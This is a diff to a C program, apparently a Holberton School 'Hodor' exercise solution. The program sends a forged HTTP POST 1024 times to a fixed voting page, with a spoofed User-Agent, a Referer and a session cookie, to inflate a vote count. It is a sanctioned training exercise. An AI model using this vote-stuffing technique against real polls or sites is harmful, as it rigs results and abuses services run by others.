@@ -4,7 +4,7 @@
  *   Solution for the Hodor Project, Level 2 by Julien Barbier.
  *   Using C Language!    BOOOOMMMMMM ! ! ! \o/ \o/ \o/
  *
- *  b y Alexandro de Oliveira, for Holberton School
+ *  by Alexandro de Oliveira, for Holberton School
  * ===-----------------------------------------------------------------------------===
 */
 
@@ -25,7 +25,7 @@ void error(const char *msg)
 int main()
 {
     int i;
-    const int votes = 1; /* Using bitwise operation to get the 1024 votes. */
+    const int votes = 1 << 10; /* Using bitwise operation to get the 1024 votes. */
     i = 0;
 
     while(i < votes) {
@@ -44,8 +44,8 @@ void vote()
     char * host      =	"173.246.108.142";
     char * message   =	"POST /level2.php HTTP/1.1\r\n"
 			"Host:173.246.108.142\r\n"
-			"Accept:*/*\r\n"
-			"User-Agent:Windows NT 1024 - (I'm kidding, I hate windows! Lol!)\r\n"
+			"Connection:close\r\n"
+			"User-Agent:Windows NT 100000000.0.0.0.1 - (I'm kidding, I hate windows! Lol!)\r\n"
 			"Referer:http://173.246.108.142/level2.php\r\n"
 			"Cookie:HoldTheDoor=990aede99b2115451d612b8c50ae6332a8026b62\r\n"
 			"Content-Length:69\r\nContent-Type: application/x-www-form-urlencoded\r\n"
@@ -57,32 +57,33 @@ void vote()
     int sockfd, bytes, sent, received, total;
     char response[4096];
 
-    /* create the socket */
+    /* Creating the socket */
     sockfd = socket(AF_INET, SOCK_STREAM, 0);
     if (sockfd < 0) error("ERROR opening socket");
 
-    /* lookup the ip address */
+    /* Lookup the IP address */
     server = gethostbyname(host);
     if (server == NULL) error("ERROR, no such host");
 
-    /* fill in the structure */
+    /* Filling in the structure */
     memset(&serv_addr,0,sizeof(serv_addr));     /* Filling the sockarrd_in struct with '0's */
     serv_addr.sin_family = AF_INET;             /* Internet Protocol(IP) v4 addresses */
     serv_addr.sin_port = htons(portno);         /* TCP/IP port */
-    memcpy(&serv_addr.sin_addr.s_addr,server -> h_addr,server -> h_length); /* Now we have the host address in the struct */
+    memcpy(&serv_addr.sin_addr.s_addr,server -> h_addr,server -> h_length);
+    /* Now we have the host address and all parameters set */
 
-    /* connect the socket */
+    /* Connecting the socket/starting the connection */
     if (connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0)
-    error("ERROR connecting");
-    /* send the request */
+	error("ERROR connecting");
+    /* Sending the request */
     total = strlen(message);
     sent = 0;
     do {
         bytes = write(sockfd,message+sent,total-sent);
         if (bytes < 0)
-        error("ERROR writing message to socket");
+	    error("ERROR writing message to socket");
         if (bytes == 0)
-        break;
+	    break;
         sent+=bytes;
     } while (sent < total);
 
@@ -93,18 +94,18 @@ void vote()
     do {
         bytes = read(sockfd,response+received,total-received);
         if (bytes < 0)
-        error("ERROR reading response from socket");
+	    error("ERROR reading response from socket");
         if (bytes == 0)
-        break;
+	    break;
         received+=bytes;
     } while (received < total);
 
     if (received == total)
-    error("ERROR storing complete response from socket");
+	error("ERROR storing complete response from socket");
 
-    /* close the socket */
+    /* Closing the socket */
     close(sockfd);
 
-    /* Print the response, optionally: */
-    printf("Response:\n%s\n",response);
+    /* Optionally, printing the response(the html body): */
+    /* printf("Response:\n%s\n",response); */
 }
